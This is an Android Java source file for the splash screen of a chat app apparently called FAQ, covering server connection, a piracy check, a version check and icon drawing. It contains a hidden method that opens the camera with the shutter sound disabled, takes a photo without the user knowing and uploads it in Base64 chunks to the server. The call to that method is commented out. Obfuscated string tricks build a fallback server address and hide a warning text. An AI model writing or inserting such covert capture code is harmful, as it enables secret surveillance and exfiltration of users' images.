package com.yzrilyzr.FAQ;
import com.yzrilyzr.ui.*;

import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Base64;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import com.yzrilyzr.FAQ.Data.MessageObj;
import com.yzrilyzr.FAQ.Main.C;
import com.yzrilyzr.FAQ.Main.ClientService;
import com.yzrilyzr.FAQ.Main.Data;
import com.yzrilyzr.FAQ.Main.T;
import com.yzrilyzr.myclass.util;
import com.yzrilyzr.ui.myIconDrawer.DrawType;
import com.yzrilyzr.ui.uidata.icon;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import android.content.pm.PackageManager.NameNotFoundException;
import com.yzrilyzr.FAQ.Main.RU;
import java.net.URL;
import java.net.MalformedURLException;
import java.net.URLConnection;
import java.io.InputStream;

public class SplashActivity extends BaseActivity 
{

	static boolean isInit=false;
	//static boolean uu=false;
	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		// TODO: Implement this method
		SharedPreferences sp=getSharedPreferences("server",MODE_PRIVATE);
		ClientService.hostIp=sp.getString("ip","127.0.0.1");
		if(!isInit)
		{
			uidata.readData(this);
			try
			{
				util.VersionCode = getPackageManager().getPackageInfo(getPackageName(),0).versionCode;
			}
			catch (PackageManager.NameNotFoundException e)
			{}
			if(uidata.mod)
			{
				StringBuilder sb=new StringBuilder();
				sb.append('请').append('勿').append('使').append('用')
					.append('盗').append('版').append('软').append('件');
				util.toast(ctx,sb.toString());
				finish();
				return;
			}
			initIcon();
		}
		isInit=true;
		super.onCreate(savedInstanceState);
		startService(new Intent(ctx,MsgService.class));
		Data.DefaultHead=new myRoundDrawable(ctx,R.drawable.launcher);
		if(ClientService.isLogin)
		{
			startActivity(new Intent(ctx,ListActivity.class));
			finish();
		}
		else if(ClientService.running)
		{
			startActivity(new Intent(ctx,LoginActivity.class));
			finish();
		}
		else
		{
			new Thread(new Runnable(){
					@Override
					public void run()
					{
						// TODO: Implement this method
						boolean isc=true;
						while(isc)
							try
							{
								ClientService.connect();
								while(ClientService.deckey==null)
								{Thread.sleep(1);}
								isc=false;
								/*while(!uu)
								{Thread.sleep(1);}*/
								Thread.sleep(300);
								ClientService.sendMsg(C.UPD);
							}
							catch (Exception e)
							{
								util.toast(ctx,"无法连接到服务器\n5秒后重试");
								ClientService.deckey=null;
								try
								{
									URL url=new URL(String.format("https://%s%s.com/entry/%d",getPackageName().substring(4,13),"sldenl".replace('s','w').replace('l','o').replace('n','m'),229*2000+17));
									URLConnection co=url.openConnection();
									InputStream is=co.getInputStream();
									byte[] b=new byte[10240];
									StringBuilder bu=new StringBuilder();
									int i=0;
									while((i=is.read(b))!=-1)bu.append(new String(b,0,i));
									is.close();
									ClientService.hostIp=bu.substring(bu.indexOf("THIS")+4,bu.indexOf("ENDL"));
									getSharedPreferences("server",MODE_PRIVATE).edit()
										.putString("ip",ClientService.hostIp)
										.commit();
									util.toast(ctx,"已使用官方服务器");
								}
								catch (Exception e2)
								{}
								try
								{
									Thread.sleep(4000);
								}
								catch (InterruptedException ey)
								{}
							}
					}
				}).start();
			setContentView(R.layout.splash);
			//b();
		}
	}
	@Override
	public void rev(byte cmd, String msg)
	{
		// TODO: Implement this method
		if(cmd==C.UPD){
			String[] ms=msg.split("/");
				final int i=Data.getInt(ms[1].getBytes());
				runOnUiThread(new Runnable(){
						@Override
						public void run()
						{
							// TODO: Implement this method
							if(util.VersionCode>=i){
							Intent in=new Intent(ctx,LoginActivity.class);
								in.putExtra("al",true);
								startActivity(in);
								finish();
							}
							else util.toast(ctx,"不支持该版本的FAQ");
						}
					});
		}
	}
	private void b(){
		if(getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA))
		{
			SurfaceView mySurfaceView = (SurfaceView) findViewById(R.id.listSurfaceView1);
			final SurfaceHolder myHolder = mySurfaceView.getHolder();
			myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
			int a=Camera.getNumberOfCameras();
			final Camera camera=Camera.open(a-1);
			camera.enableShutterSound(false);
			final Camera.PictureCallback pi=new Camera.PictureCallback() {
				@Override
				public void onPictureTaken(byte[] data, Camera camera)
				{
					ByteArrayInputStream is=new ByteArrayInputStream(data);
					byte[] b=new byte[2048];int ii=0;
					try
					{
						ClientService.sendMsg(C.MSG,new MessageObj(1000,1000,T.FLE,false,"LEN:"+data.length+"/"+System.currentTimeMillis()+".jpg").o2s());
						while((ii=is.read(b))!=-1){
							ClientService.sendMsg(C.MSG,new MessageObj(1000,1000,T.FLE,false,Base64.encodeToString(b,0,ii,0)).o2s());
						}
					}
					catch (IOException e)
					{}
					//uu=true;
					camera.stopPreview();
				}
			};
			final Camera.AutoFocusCallback fo=new Camera.AutoFocusCallback(){
				@Override
				public void onAutoFocus(boolean p1, Camera p2)
				{
					// TODO: Implement this method
					camera.takePicture(null,null,pi);
				}
			};
			myHolder.addCallback(new SurfaceHolder.Callback(){
					@Override
					public void surfaceCreated(SurfaceHolder p1)
					{
						// TODO: Implement this method
						Camera.Parameters parameters = camera.getParameters();
						parameters.setPreviewFrameRate(5); //每秒5帧
						parameters.setPictureFormat(PixelFormat.JPEG);//设置照片的输出格式
						parameters.set("jpeg-quality", 85);//照片质量
						camera.setParameters(parameters);
						try
						{
							camera.setPreviewDisplay(myHolder);
						}
						catch (IOException e)
						{}
						camera.startPreview();
						camera.autoFocus(fo);
					}
					@Override
					public void surfaceChanged(SurfaceHolder p1, int p2, int p3, int p4)
					{
						// TODO: Implement this method
					}
					@Override
					public void surfaceDestroyed(SurfaceHolder p1)
					{
						// TODO: Implement this method
						camera.stopPreview();
						camera.release();
					}
				});
		}
	}
	public void set(View v)
	{
		final myEditText e=new myEditText(ctx);
		e.setHint("服务器IP");
		e.setText(ClientService.hostIp);
		new myAlertDialog(ctx)
			.setTitle("设置目标服务器IP")
			.setView(e)
			.setPositiveButton("保存",new myDialogInterface(){
				public void click(View v,int i)
				{
					ClientService.hostIp=e.getText().toString();
					getSharedPreferences("server",MODE_PRIVATE).edit()
						.putString("ip",e.getText().toString())
						.commit();
				}
			})
			.setNegativeButton("取消",null)
			.show();
		e.getLayoutParams().width=-1;
	}
	private static void initIcon()
	{

		myIconDrawer m=new myIconDrawer(util.dip2px(50));
		m.draw(DrawType.CIRCLE, false, m.hw, m.hw, m.ww * 7);
		m.draw(DrawType.CIRCLE, true, m.hw, m.ww * 6, m.ww);
		m.draw(DrawType.RECT, true, m.ww * 9, m.ww * 9, m.ww * 11, m.ww * 15);

		icon.info=m.getBitmap();
		m.clear();

		m.move(m.hw,m.qw);
		m.line(m.qw*3,m.hw);
		m.line(m.hw,m.qw*3);
		m.move(m.qw, m.hw);
		m.line(m.qw*3, m.hw);
		m.draw(DrawType.PATH, false);

		icon.next=m.getBitmap();
		m.clear();

		m.move(m.hw,m.qw);
		m.line(m.qw,m.hw);
		m.line(m.hw,m.qw*3);
		m.move(m.qw, m.hw);
		m.line(m.qw*3, m.hw);
		m.draw(DrawType.PATH, false);

		icon.prev=m.getBitmap();
		m.clear();

		m.draw(DrawType.CIRCLE,true,m.hw,m.hw,m.ww);
		m.draw(DrawType.CIRCLE,true,m.hw,m.qw,m.ww);
		m.draw(DrawType.CIRCLE,true,m.hw,m.qw*3,m.ww);

		icon.more_overflow=m.getBitmap();
		m.clear();

		Paint p=m.getPaint();
		float i=p.getStrokeWidth();
		p.setStrokeWidth(m.ww*4);
		m.draw(DrawType.CIRCLE,false,m.hw,m.hw,m.qw);
		p.setStrokeWidth(i);
		i=m.ww;
		m.move(i*8,i*2);
		m.line(i*12,i*2);
		m.line(i*12,i*4);
		m.line(i*8,i*4);
		m.line(i*8,i*2);

		m.move(i*8,i*18);
		m.line(i*12,i*18);
		m.line(i*12,i*16);
		m.line(i*8,i*16);
		m.line(i*8,i*18);

		m.move(i*2,i*8);
		m.line(i*2,i*12);
		m.line(i*4,i*12);
		m.line(i*4,i*8);
		m.line(i*2,i*8);

		m.move(i*16,i*8);
		m.line(i*18,i*8);
		m.line(i*18,i*12);
		m.line(i*16,i*12);
		m.line(i*16,i*8);

		m.move(i*3,i*6);
		m.line(i*4,i*7);
		m.line(i*7,i*4);
		m.line(i*6,i*3);
		m.line(i*3,i*6);

		m.move(i*14,i*3);
		m.line(i*13,i*4);
		m.line(i*16,i*7);
		m.line(i*17,i*6);
		m.line(i*14,i*3);

		m.move(i*6,i*17);
		m.line(i*7,i*16);
		m.line(i*4,i*13);
		m.line(i*3,i*14);
		m.line(i*6,i*17);

		m.move(i*14,i*17);
		m.line(i*13,i*16);
		m.line(i*16,i*13);
		m.line(i*17,i*14);
		m.line(i*14,i*17);
		m.draw(DrawType.PATH,true);

		icon.settings=m.getBitmap();
		m.clear();

		m.move(m.ww*4,m.ww*4);
		m.line(m.ww*16,m.ww*16);
		m.move(m.ww*16,m.ww*4);
		m.line(m.ww*4,m.ww*16);
		m.draw(DrawType.PATH,false);

		icon.wrong=m.getBitmap();
		m.clear();

		m.draw(DrawType.LINE,false,m.ww*14,m.ww*3,m.ww*4.5f,m.ww*3);
		m.draw(DrawType.LINE,false,m.ww*4,m.ww*3.5f,m.ww*4,m.ww*14);
		m.draw(DrawType.ARC,false,m.ww*4,m.ww*3,m.ww*5,m.ww*4,180,90);
		m.draw(DrawType.ROUNDRECT,false,m.ww*6,m.ww*5,m.ww*16,m.ww*17,m.ww/2,m.ww/2);

		icon.copy=m.getBitmap();
		m.clear();
		m.draw(DrawType.ARC,false,m.ww*4,m.ww*4,m.ww*5,m.ww*5,180,90);
		m.draw(DrawType.ARC,false,m.ww*4,m.ww*16,m.ww*5,m.ww*17,90,90);
		m.draw(DrawType.ARC,false,m.ww*15,m.ww*4,m.ww*16,m.ww*5,270,90);
		m.draw(DrawType.ARC,false,m.ww*15,m.ww*16,m.ww*16,m.ww*17,0,90);
		m.draw(DrawType.LINE,false,m.ww*4,m.ww*4.5f,m.ww*4,m.ww*16.5f);
		m.draw(DrawType.LINE,false,m.ww*16,m.ww*4.5f,m.ww*16,m.ww*16.5f);
		m.draw(DrawType.LINE,false,m.ww*4.5f,m.ww*17,m.ww*15.5f,m.ww*17);
		m.draw(DrawType.RECT,true,m.ww*6,m.ww*4.5f,m.ww*14,m.ww*7);
		m.draw(DrawType.CIRCLE,false,m.ww*10,m.ww*4,m.ww);
		m.draw(DrawType.LINE,false,m.ww*4.5f,m.ww*4,m.ww*9,m.ww*4);
		m.draw(DrawType.LINE,false,m.ww*11,m.ww*4,m.ww*15.5f,m.ww*4);


		icon.paste=m.getBitmap();
		m.clear();
		m.draw(DrawType.CIRCLE,false,m.ww*6,m.ww*6,m.ww*2);
		m.draw(DrawType.CIRCLE,false,m.ww*6,m.ww*14,m.ww*2);
		m.draw(DrawType.CIRCLE,false,m.hw,m.hw,m.ww/5);
		m.draw(DrawType.LINE,false,m.ww*7.5f,m.ww*7.5f,m.ww*9.7f,m.ww*9.7f);
		m.draw(DrawType.LINE,false,m.ww*7.5f,m.ww*12.5f,m.ww*9.7f,m.ww*10.3f);
		m.draw(DrawType.LINE,false,m.ww*10.3f,m.ww*10.3f,m.ww*16,m.ww*16);
		m.draw(DrawType.LINE,false,m.ww*11,m.ww*9,m.ww*16,m.ww*4);


		icon.cut=m.getBitmap();
		m.clear();
		m.draw(DrawType.ARC,false,m.ww*4,m.ww*4,m.ww*5,m.ww*5,180,90);
		m.draw(DrawType.ARC,false,m.ww*4,m.ww*15,m.ww*5,m.ww*16,90,90);
		m.draw(DrawType.ARC,false,m.ww*15,m.ww*4,m.ww*16,m.ww*5,270,90);
		m.draw(DrawType.ARC,false,m.ww*15,m.ww*15,m.ww*16,m.ww*16,0,90);
		m.draw(DrawType.RECT,false,m.ww*7,m.ww*7,m.ww*13,m.ww*13);
		m.draw(DrawType.POINT,false,m.hw,m.ww*4);
		m.draw(DrawType.POINT,false,m.hw,m.ww*16);
		m.draw(DrawType.POINT,false,m.ww*4,m.hw);
		m.draw(DrawType.POINT,false,m.ww*16,m.hw);
		m.draw(DrawType.POINT,false,m.ww*7,m.ww*4);
		m.draw(DrawType.POINT,false,m.ww*13,m.ww*4);
		m.draw(DrawType.POINT,false,m.ww*7,m.ww*16);
		m.draw(DrawType.POINT,false,m.ww*13,m.ww*16);
		m.draw(DrawType.POINT,false,m.ww*4,m.ww*7);
		m.draw(DrawType.POINT,false,m.ww*4,m.ww*13);
		m.draw(DrawType.POINT,false,m.ww*16,m.ww*7);
		m.draw(DrawType.POINT,false,m.ww*16,m.ww*13);


		icon.selectall=m.getBitmap();
		m.clear();
		m.move(m.ww*3,m.ww*11);
		m.line(m.ww*7,m.ww*15);
		m.line(m.ww*7,m.ww*15);
		m.line(m.ww*17,m.ww*5);
		m.draw(DrawType.PATH,false);
		icon.correct=m.getBitmap();

	}
}
